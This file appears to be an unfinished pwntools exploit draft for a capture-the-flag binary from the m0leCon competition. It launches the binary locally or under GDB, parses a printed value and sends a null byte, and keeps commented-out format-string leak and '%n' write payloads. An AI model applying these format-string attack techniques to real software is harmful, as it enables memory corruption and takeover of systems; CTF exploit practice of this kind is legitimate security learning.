from pwn import *
import time
binf = ELF("chall")
libc = ELF.libc

'''
main 0x14b5
lectura del 1 fopen = 0x5555555554e3 = 0xfbad2488
0x555555555521 <main+108>    mov    eax, dword ptr [rbp - 0x14] antes de srand
0X133C IN-WHILE
'''

gs = '''
break *0x555555555466
'''
def start():
    if args.GDB:
        return gdb.debug(binf.path, gdbscript=gs)
    else:
        return process(binf.path)
        # return remote("challs.m0lecon.it",1907)

context.log_level = "DEBUG"
context.aslr = False

print(binf.plt)

shell=""
shell=b"flag.txt"



# i=1
# while(True):
p=start()
p.recvline()
sumed=p.recvline()
sumed=str(sumed).split(',')[1].split(' ')[3].split('!')[0]
print('type(sumed)> ',type(sumed))
print('sumed> ',sumed)
# exp='%15$p'
# exp+='%21$p'
# exp= '%'+str(10000+11+1)+'x%7$n'
# exp+='%'+str(11)+'x%9$n'
# exp+='%'+str(1)+'x%11$n'
exp='\x00'
p.send(exp)
print('*'*50)
print('*'*50)
# i=i+1
p.interactive()
# sleep(0.4)
# p.sendline('')